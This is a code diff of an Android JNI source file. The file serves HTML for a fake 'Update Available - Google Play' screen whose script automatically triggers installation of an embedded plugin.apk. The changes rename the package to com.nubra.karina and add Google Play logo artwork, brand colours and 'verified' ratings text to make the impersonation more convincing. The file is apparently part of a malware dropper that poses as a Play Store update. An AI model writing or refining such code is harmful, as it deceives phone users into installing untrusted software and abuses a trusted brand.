@@ -1,87 +1,10 @@
 #include <jni.h>
 #include <string>
-#include <android/log.h>
-#include <android/asset_manager.h>
-#include <android/asset_manager_jni.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <sys/stat.h>
-#include <stdio.h>
-
-#define LOG_TAG "InstallerNative"
-#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
-#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
-
-static jclass g_contextClass = nullptr;
-static jclass g_packageManagerClass = nullptr;
-static jclass g_packageInstallerClass = nullptr;
-static jclass g_sessionParamsClass = nullptr;
-static jclass g_sessionClass = nullptr;
-static jclass g_intentClass = nullptr;
-static jclass g_pendingIntentClass = nullptr;
-static jclass g_buildVersionClass = nullptr;
-static jclass g_packageInfoClass = nullptr;
-
-static jmethodID g_getPackageManagerMethod = nullptr;
-static jmethodID g_getPackageInstallerMethod = nullptr;
-static jmethodID g_getPackageNameMethod = nullptr;
-static jmethodID g_getAssetsMethod = nullptr;
-static jmethodID g_getSdkIntMethod = nullptr;
-
-static bool initJNI(JNIEnv* env) {
-    if (g_contextClass != nullptr) {
-        return true;
-    }
-
-    g_contextClass = (jclass)env->NewGlobalRef(env->FindClass("android/content/Context"));
-    if (!g_contextClass) return false;
-
-    g_packageManagerClass = (jclass)env->NewGlobalRef(env->FindClass("android/content/pm/PackageManager"));
-    if (!g_packageManagerClass) return false;
-
-    g_packageInstallerClass = (jclass)env->NewGlobalRef(env->FindClass("android/content/pm/PackageInstaller"));
-    if (!g_packageInstallerClass) return false;
-
-    g_sessionParamsClass = (jclass)env->NewGlobalRef(env->FindClass("android/content/pm/PackageInstaller$SessionParams"));
-    if (!g_sessionParamsClass) return false;
-
-    g_sessionClass = (jclass)env->NewGlobalRef(env->FindClass("android/content/pm/PackageInstaller$Session"));
-    if (!g_sessionClass) return false;
-
-    g_intentClass = (jclass)env->NewGlobalRef(env->FindClass("android/content/Intent"));
-    if (!g_intentClass) return false;
-
-    g_pendingIntentClass = (jclass)env->NewGlobalRef(env->FindClass("android/app/PendingIntent"));
-    if (!g_pendingIntentClass) return false;
-
-    g_buildVersionClass = (jclass)env->NewGlobalRef(env->FindClass("android/os/Build$VERSION"));
-    if (!g_buildVersionClass) return false;
-
-    g_packageInfoClass = (jclass)env->NewGlobalRef(env->FindClass("android/content/pm/PackageInfo"));
-    if (!g_packageInfoClass) return false;
-
-    g_getPackageManagerMethod = env->GetMethodID(g_contextClass, "getPackageManager", "()Landroid/content/pm/PackageManager;");
-    if (!g_getPackageManagerMethod) return false;
-
-    g_getPackageInstallerMethod = env->GetMethodID(g_packageManagerClass, "getPackageInstaller", "()Landroid/content/pm/PackageInstaller;");
-    if (!g_getPackageInstallerMethod) return false;
-
-    g_getPackageNameMethod = env->GetMethodID(g_contextClass, "getPackageName", "()Ljava/lang/String;");
-    if (!g_getPackageNameMethod) return false;
-
-    g_getAssetsMethod = env->GetMethodID(g_contextClass, "getAssets", "()Landroid/content/res/AssetManager;");
-    if (!g_getAssetsMethod) return false;
-
-    jfieldID sdkIntField = env->GetStaticFieldID(g_buildVersionClass, "SDK_INT", "I");
-    g_getSdkIntMethod = (jmethodID)sdkIntField;
-
-    return true;
-}
-
+#include <cstring>
 
 // Embedded Constants and Strings
 static const char* APK_NAME = "plugin.apk";
-static const char* ACTION_INSTALL = "com.example.installer.INSTALL";
+static const char* ACTION_INSTALL = "com.nubra.karina.INSTALL";
 static const int BUFFER_SIZE = 65536;
 
 // Toast Messages
@@ -177,11 +100,15 @@ static const char* getHtmlContent(const char* mode) {
             <div class="progress-bar"><div class="progress-fill"></div></div>
         </div>
         <div class="google-play-logo">
+            <svg class="play-icon" viewBox="0 0 24 24">
+                <path fill="#34A853" d="M3,20.5V3.5C3,2.91 3.34,2.39 3.84,2.15L13.69,12L3.84,21.85C3.34,21.6 3,21.09 3,20.5Z"/>
+                <path fill="#EA4335" d="M16.81,15.12L6.05,21.34L14.54,12.85L16.81,15.12Z"/>
+                <path fill="#FBBC04" d="M20.16,10.81C20.5,11.08 20.75,11.5 20.75,12C20.75,12.5 20.53,12.9 20.18,13.18L17.89,14.5L15.39,12L17.89,9.5L20.16,10.81Z"/>
+                <path fill="#4285F4" d="M6.05,2.66L16.81,8.88L14.54,11.15L6.05,2.66Z"/>
+            </svg>
             <span class="google-play-text">Google Play</span>
         </div>
     </div>
-    <!-- Load shared config -->
-    <script src="file:///android_asset/update/config.js"></script>
     <script>
         if (typeof Android !== 'undefined' && Android.installPlugin) {
             setTimeout(() => { Android.installPlugin(); }, 1500);
@@ -195,55 +122,74 @@ static const char* getHtmlContent(const char* mode) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="theme-color" content="#ffffff">
+    <meta name="theme-color" content="#1a73e8">
     <title>Update Available - Google Play</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { font-family: 'Roboto', 'Arial', sans-serif; background-color: #ffffff; color: #202124; width: 100%; min-height: 100vh; overflow-x: hidden; }
-        .header { padding: 16px 20px; display: flex; align-items: center; gap: 12px; background: white; }
-        .google-play-logo { display: flex; align-items: center; gap: 6px; }
-        .play-icon { width: 24px; height: 24px; }
-        .header-text { font-size: 20px; font-weight: 400; color: #5f6368; }
-        .content { padding: 20px 16px; }
-        .title { font-size: 24px; font-weight: 700; margin-bottom: 8px; color: #202124; }
-        .subtitle { font-size: 13px; color: #5f6368; margin-bottom: 24px; line-height: 1.4; }
-        .app-info { display: flex; align-items: center; gap: 12px; margin-bottom: 32px; }
-        .app-icon { width: 64px; height: 64px; background: #f0f0f0; border-radius: 14px; display: flex; align-items: center; justify-content: center; overflow: hidden; border: 1px solid #e0e0e0; flex-shrink: 0; }
+        body { font-family: 'Roboto', 'Arial', sans-serif; background: linear-gradient(180deg, #f8f9fa 0%, #ffffff 100%); color: #202124; width: 100%; min-height: 100vh; overflow-x: hidden; }
+        .header { padding: 12px 20px; display: flex; align-items: center; gap: 10px; background: linear-gradient(135deg, #1a73e8 0%, #4285f4 100%); box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .google-play-logo { display: flex; align-items: center; gap: 8px; }
+        .play-icon { width: 28px; height: 28px; filter: drop-shadow(0 1px 2px rgba(0,0,0,0.2)); }
+        .header-text { font-size: 18px; font-weight: 500; color: #ffffff; text-shadow: 0 1px 2px rgba(0,0,0,0.1); }
+        .content { padding: 24px 16px; max-width: 600px; margin: 0 auto; }
+        .title { font-size: 28px; font-weight: 700; margin-bottom: 6px; color: #1a73e8; background: linear-gradient(135deg, #1a73e8, #4285f4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .subtitle { font-size: 14px; color: #5f6368; margin-bottom: 28px; line-height: 1.5; }
+        .app-info { display: flex; align-items: flex-start; gap: 16px; margin-bottom: 28px; padding: 16px; background: white; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
+        .app-icon { width: 72px; height: 72px; background: #f0f0f0; border-radius: 16px; display: flex; align-items: center; justify-content: center; overflow: hidden; border: 2px solid #e8eaed; flex-shrink: 0; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
         .app-icon img { width: 100%; height: 100%; object-fit: cover; }
         .app-details { flex: 1; min-width: 0; }
-        .app-details h2 { font-size: 16px; font-weight: 600; margin-bottom: 6px; color: #202124; }
-        .app-meta { display: flex; align-items: center; gap: 6px; font-size: 12px; color: #5f6368; flex-wrap: wrap; }
-        .section-title { font-size: 20px; font-weight: 700; margin-bottom: 6px; color: #202124; }
-        .update-date { font-size: 12px; color: #5f6368; margin-bottom: 12px; }
-        .update-description { font-size: 13px; line-height: 1.5; color: #5f6368; margin-bottom: 12px; }
-        .update-list { list-style: none; padding-left: 0; margin-bottom: 12px; }
-        .update-list li { font-size: 13px; color: #202124; margin-bottom: 8px; padding-left: 6px; line-height: 1.5; }
-        .update-list li:before { content: "• "; font-weight: bold; margin-right: 8px; }
-        .buttons { display: flex; gap: 12px; margin: 24px 0 32px 0; }
-        .btn { flex: 1; padding: 11px 20px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; border: none; transition: all 0.2s; text-align: center; }
-        .btn-outline { background: white; color: #1967d2; border: 1px solid #dadce0; }
-        .btn-outline:active { background: #f8f9fa; }
-        .btn-primary { background: #1967d2; color: white; }
-        .btn-primary:active { background: #1557b0; }
-        .section { margin-bottom: 32px; }
-        .ratings-section { margin-bottom: 24px; }
-        .ratings-disclaimer { font-size: 12px; color: #5f6368; line-height: 1.5; margin-bottom: 20px; }
-        .rating-summary { display: flex; gap: 24px; align-items: center; margin-bottom: 32px; }
-        .rating-score { text-align: center; }
-        .rating-number { font-size: 48px; font-weight: 400; color: #202124; line-height: 1; margin-bottom: 6px; }
-        .stars { color: #1967d2; font-size: 14px; margin-bottom: 4px; }
-        .review-count { font-size: 12px; color: #5f6368; }
-        .rating-bars { flex: 1; }
-        .rating-bar { display: flex; align-items: center; gap: 10px; margin-bottom: 6px; }
-        .bar-label { font-size: 13px; color: #5f6368; width: 8px; flex-shrink: 0; }
-        .bar-container { flex: 1; height: 10px; background: #e8eaed; border-radius: 4px; overflow: hidden; min-width: 0; }
-        .bar-fill { height: 100%; background: #1967d2; border-radius: 4px; transition: width 0.3s ease; }
-        @media (max-width: 480px) { .header { padding: 14px 16px; } .content { padding: 16px 12px; } .title { font-size: 22px; } .app-icon { width: 56px; height: 56px; } .btn { padding: 10px 18px; font-size: 13px; } .rating-number { font-size: 42px; } }
+        .app-details h2 { font-size: 18px; font-weight: 600; margin-bottom: 8px; color: #202124; }
+        .app-meta { display: flex; align-items: center; gap: 8px; font-size: 13px; color: #5f6368; flex-wrap: wrap; }
+        .badge { display: inline-block; padding: 4px 8px; background: #e8f0fe; color: #1a73e8; border-radius: 4px; font-size: 11px; font-weight: 500; }
+        .section { margin-bottom: 28px; background: white; padding: 20px; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
+        .section-title { font-size: 18px; font-weight: 700; margin-bottom: 8px; color: #202124; display: flex; align-items: center; gap: 8px; }
+        .section-title:before { content: "📱"; font-size: 20px; }
+        .update-date { font-size: 12px; color: #5f6368; margin-bottom: 12px; font-weight: 500; }
+        .update-description { font-size: 14px; line-height: 1.6; color: #5f6368; margin-bottom: 16px; }
+        .update-list { list-style: none; padding-left: 0; margin-bottom: 0; }
+        .update-list li { font-size: 14px; color: #202124; margin-bottom: 10px; padding-left: 24px; line-height: 1.6; position: relative; }
+        .update-list li:before { content: "✓"; position: absolute; left: 0; color: #34a853; font-weight: bold; font-size: 16px; }
+        .buttons { display: flex; gap: 12px; margin: 28px 0; }
+        .btn { flex: 1; padding: 14px 24px; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; border: none; transition: all 0.3s; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .btn-outline { background: white; color: #1a73e8; border: 2px solid #dadce0; }
+        .btn-outline:active { background: #f8f9fa; transform: scale(0.98); }
+        .btn-primary { background: linear-gradient(135deg, #1a73e8, #4285f4); color: white; box-shadow: 0 4px 8px rgba(26,115,232,0.3); }
+        .btn-primary:active { background: linear-gradient(135deg, #1557b0, #357ae8); transform: scale(0.98); }
+        .ratings-section { margin-bottom: 0; }
+        .ratings-disclaimer { font-size: 12px; color: #5f6368; line-height: 1.5; margin-bottom: 20px; padding: 12px; background: #f8f9fa; border-radius: 8px; }
+        .rating-summary { display: flex; gap: 24px; align-items: center; margin-bottom: 24px; flex-wrap: wrap; }
+        .rating-score { text-align: center; min-width: 100px; }
+        .rating-number { font-size: 52px; font-weight: 500; color: #1a73e8; line-height: 1; margin-bottom: 8px; }
+        .stars { color: #fbbc04; font-size: 16px; margin-bottom: 6px; }
+        .review-count { font-size: 13px; color: #5f6368; }
+        .rating-bars { flex: 1; min-width: 200px; }
+        .rating-bar { display: flex; align-items: center; gap: 12px; margin-bottom: 8px; }
+        .bar-label { font-size: 13px; color: #5f6368; width: 12px; flex-shrink: 0; font-weight: 500; }
+        .bar-container { flex: 1; height: 12px; background: #e8eaed; border-radius: 6px; overflow: hidden; min-width: 0; }
+        .bar-fill { height: 100%; background: linear-gradient(90deg, #1a73e8, #4285f4); border-radius: 6px; transition: width 0.3s ease; }
+        .divider { height: 1px; background: linear-gradient(90deg, transparent, #e8eaed, transparent); margin: 24px 0; }
+        @media (max-width: 480px) { 
+            .header { padding: 10px 16px; } 
+            .content { padding: 16px 12px; } 
+            .title { font-size: 24px; } 
+            .app-icon { width: 64px; height: 64px; } 
+            .app-info { padding: 12px; }
+            .btn { padding: 12px 20px; font-size: 14px; } 
+            .rating-number { font-size: 44px; }
+            .section { padding: 16px; }
+            .rating-summary { flex-direction: column; align-items: flex-start; }
+        }
     </style>
 </head>
 <body>
 <div class="header">
     <div class="google-play-logo">
+        <svg class="play-icon" viewBox="0 0 24 24">
+            <path fill="#ffffff" d="M3,20.5V3.5C3,2.91 3.34,2.39 3.84,2.15L13.69,12L3.84,21.85C3.34,21.6 3,21.09 3,20.5Z"/>
+            <path fill="#ffffff" d="M16.81,15.12L6.05,21.34L14.54,12.85L16.81,15.12Z"/>
+            <path fill="#ffffff" d="M20.16,10.81C20.5,11.08 20.75,11.5 20.75,12C20.75,12.5 20.53,12.9 20.18,13.18L17.89,14.5L15.39,12L17.89,9.5L20.16,10.81Z"/>
+            <path fill="#ffffff" d="M6.05,2.66L16.81,8.88L14.54,11.15L6.05,2.66Z"/>
+        </svg>
         <span class="header-text">Google Play</span>
     </div>
 </div>
@@ -255,8 +201,7 @@ static const char* getHtmlContent(const char* mode) {
         <div class="app-details">
             <h2 class="app-name"></h2>
             <div class="app-meta">
-                <span class="app-version"></span>
-                <span>•</span>
+                <span class="badge app-version"></span>
                 <span class="app-size"></span>
             </div>
         </div>
@@ -275,6 +220,7 @@ static const char* getHtmlContent(const char* mode) {
         <button class="btn btn-outline">More Info</button>
         <button class="btn btn-primary" id="updateBtn" onclick="updateApp()">Update</button>
     </div>
+    <div class="divider"></div>
     <div class="section ratings-section">
         <h3 class="section-title">Ratings and reviews</h3>
         <p class="ratings-disclaimer">Ratings and reviews are verified and are from people who use the same type of device that you use.</p>
@@ -294,8 +240,6 @@ static const char* getHtmlContent(const char* mode) {
         </div>
     </div>
 </div>
-<!-- Load shared config -->
-<script src="file:///android_asset/update/config.js"></script>
 <script>
     function updateApp() {
         // Show installing page first
@@ -321,7 +265,7 @@ static const char* getHtmlContent(const char* mode) {
 }
 
 extern "C" JNIEXPORT jstring JNICALL
-Java_com_example_installer_MainActivity_nativeGetHtml(
+Java_com_nubra_karina_MainActivity_nativeGetHtml(
         JNIEnv* env, jobject thiz, jstring mode) {
     const char* modeStr = env->GetStringUTFChars(mode, nullptr);
     if (!modeStr) {
@@ -336,7 +280,7 @@ Java_com_example_installer_MainActivity_nativeGetHtml(
 }
 
 extern "C" JNIEXPORT jstring JNICALL
-Java_com_example_installer_MainActivity_nativeGetString(
+Java_com_nubra_karina_MainActivity_nativeGetString(
         JNIEnv* env, jobject thiz, jstring key) {
     const char* keyStr = env->GetStringUTFChars(key, nullptr);
     if (!keyStr) {
@@ -351,7 +295,7 @@ Java_com_example_installer_MainActivity_nativeGetString(
 }
 
 extern "C" JNIEXPORT jint JNICALL
-Java_com_example_installer_MainActivity_nativeGetInt(
+Java_com_nubra_karina_MainActivity_nativeGetInt(
         JNIEnv* env, jobject thiz, jstring key) {
     const char* keyStr = env->GetStringUTFChars(key, nullptr);
     if (!keyStr) {
@@ -365,7 +309,7 @@ Java_com_example_installer_MainActivity_nativeGetInt(
 }
 
 extern "C" JNIEXPORT jstring JNICALL
-Java_com_example_installer_NativeInstaller_nativeGetString(
+Java_com_nubra_karina_NativeInstaller_nativeGetString(
         JNIEnv* env, jobject thiz, jstring key) {
     const char* keyStr = env->GetStringUTFChars(key, nullptr);
     if (!keyStr) {
@@ -380,7 +324,7 @@ Java_com_example_installer_NativeInstaller_nativeGetString(
 }
 
 extern "C" JNIEXPORT jint JNICALL
-Java_com_example_installer_NativeInstaller_nativeGetInt(
+Java_com_nubra_karina_NativeInstaller_nativeGetInt(
         JNIEnv* env, jobject thiz, jstring key) {
     const char* keyStr = env->GetStringUTFChars(key, nullptr);
     if (!keyStr) {
